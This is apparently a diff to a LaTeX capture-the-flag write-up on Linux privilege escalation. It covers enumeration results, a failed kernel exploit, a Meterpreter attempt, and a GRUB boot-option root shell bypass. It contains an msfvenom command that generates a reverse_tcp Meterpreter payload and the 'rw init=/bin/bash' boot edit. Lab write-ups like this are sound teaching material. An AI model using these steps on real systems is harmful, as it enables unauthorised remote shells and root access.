@@ -334,10 +334,9 @@ If you want to escalate your privileges on Linux, you have five options, which a
 \end{enumerate}
 
 \subsubsection{Using a smart enumeration tool}
-To quickly and efforlessly information about possible attack vecotors for a priveldege escalation there are tools such as \texttt{linux-smart-enumeration} to do the job for you after running the script on both users that there were no attack vecotrs which we could exploit we out that there was a empty backup file in the following location {/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz} and that there is a \texttt{screen} session by the root user which we cannot attach to  and lastly that the binarys \texttt{/snap/snapd/23545/usr/lib/snapd/snap-confine} and \texttt{/snap/snapd/23258/usr/lib/snapd/snap-confine} run as root but there is only a cive for it which is alr patched for years.
+To quickly and effortlessly gather information about possible attack vectors for privilege escalation, there are tools such as \texttt{linux-smart-enumeration} to do the job for you. After running the script on both users, we found that there were no attack vectors we could exploit. We discovered an empty backup file in the following location: \texttt{/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz}, and a \texttt{screen} session by the root user which we could not attach to. Additionally, the binaries \texttt{/snap/snapd/23545/usr/lib/snapd/snap-confine} and \texttt{/snap/snapd/23258/usr/lib/snapd/snap-confine} run as root, but the only available exploit for them has been patched for years. Furthermore, the only command we could run with elevated privileges is \texttt{cat /opt/secret\_flag.txt}, which does not allow us to escalate to the command line interface (CLI). Lastly, not a single cron file was writable, nor were we able to view configuration files such as \texttt{/etc/sudoers}, which means there is no way to get root privileges on the system. This is further proven by the setup script not setting anything up to make root accessible without directly modifying the virtual machine.\cite{lse,suid,sudo-exploit,enumeration-walkthough}
 \subsubsection{trying a kernel level exploit}
-\subsubsection{checking suid binarys}
-\subsubsection{checking root proccses}
+We also tried a kernel exploit from \texttt{exploit-db} out of desperation, which failed at compiling \cite{exploitdb}.
 \subsubsection{Trying to get privileges using Metasploit and Meterpreter}
 Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.\abc
 To do this, we had to generate a payload first. While we could have just used a Netcat shell and upgraded to Meterpreter, we took this opportunity to learn something new. The payload was generated with the following command: \texttt{msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin}, which is also broken down below.\cite{msfvenomdocs}
@@ -380,8 +379,21 @@ Now that we have access to Meterpreter, we can use commands such as \texttt{getu
 	\caption{The required modules not being loaded}
 \end{figure}\abc
 \newpage
-\subsubsection{trying other common ctf priv escalation ways}
-\subsection{reseting the root password and exploring the vm}
+\subsection{Getting root access through editing the GRUB boot options}
+Since we weren't able to gain access, we resorted to the good old and reliable GRUB root password reset. \cite{root-grub}
+To use this method, the system needs to be running the GRUB boot loader, which is the default for Ubuntu.\abc
+It is performed by pressing \texttt{e} when seeing the screen shown in Figure 33, which brings up the menu to edit the boot commands.
+\begin{figure}[h]
+	\includegraphics[scale=0.51]{images/pe.png}
+	\centering
+	\caption{Showing the GRUB screen to press \texttt{e} on}
+\end{figure}\abc
+Then navigate to the line starting with \texttt{linux} and append \texttt{rw init=/bin/bash}, as shown in Figure 34, to change a kernel parameter. After pressing F10, you will immediately boot into the system with a root shell.
+\begin{figure}[h]
+	\includegraphics[scale=0.51]{images/rw+.png}
+	\centering
+	\caption{Showing the GRUB screen to press \texttt{e} on}
+\end{figure}\abc
 \subsection{7 flags}
 \newpage
 \section{References}
